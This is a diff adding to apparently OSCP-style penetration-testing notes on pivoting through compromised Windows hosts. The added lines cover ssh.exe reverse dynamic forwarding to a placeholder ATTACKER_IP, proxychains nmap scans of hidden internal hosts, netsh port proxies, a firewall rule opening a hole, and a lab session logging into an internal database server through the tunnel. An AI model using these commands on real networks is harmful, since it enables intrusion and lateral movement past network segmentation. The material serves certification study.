@@ -134,8 +134,6 @@ adjust_timeouts2: packet supposedly had rtt of 15132217 microseconds.  Ignoring 
 ```
 
 
-
-
 ### Windows - SSH.exe
 On windows, the command to check for other subnets is `ipconfig`
 
@@ -144,9 +142,52 @@ where ssh
 
 ssh.exe -V
 // If it's above version 7.6, dynamic remote port forwarding can be used.
+ssh.exe -N -R ATTACKER_LOCAL_PORT ATTACKER_USER@ATTACKER_IP           // Run from the remote machine
+// change "socks5 REMOTE_IP PORT" to "socks5 LOCAL_IP LOCAL_PORT" in /etc/proxychains.conf locally
+proxychains nmap -n -sT --top-port=10 HIDDEN_MACHINE_REACHABLE_IP        // make sure to use '-n' and '-sT'
 ```
 
 ```
 C:\Users\rdp_admin>where ssh
 C:\Windows\System32\OpenSSH\ssh.exe
+```
+
+### Windows - NetSH
+In very rare and restrictive situations, the Windows built-in tool `NetSH` can be used.
+`NetSH` can only be used by Administrators, keeping `UAC` in mind.
+
+
+```
+netsh interface portproxy add v4tov4 listenport=EXTERNAL_PORT listenaddress=OWN_IP connectport=HIDDEN_TARGET_PORT connectaddress=HIDDEN_TARGET_IP
+```
+`v4tov4`: An IPv4 listener is forwarder to an IPv4 host.
+
+```
+netsh interface portproxy show all       // List all proxies on this system
+```
+
+Creating a firewall rule to add a hole in the system:
+```
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=OWN_IP localport=2222 action=allow
+```
+Cleaning up:
+```
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+```
+
+
+##### Example
+```
+PS C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.171.64 connectport=22 connectaddress=10.4.171.215            // opens port 2222, redirects to to port 22
+PS C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.171.64 localport=2222 action=allow
+Ok.
+
+
+┌─[root@edu-virtualbox]─[/tmp/oscp]
+└──╼ #ssh database_admin@192.168.171.64 -p2222
+database_admin@192.168.171.64's password: 
+Permission denied, please try again.
+database_admin@192.168.171.64's password: 
+database_admin@pgdatabase01:~$
 ```
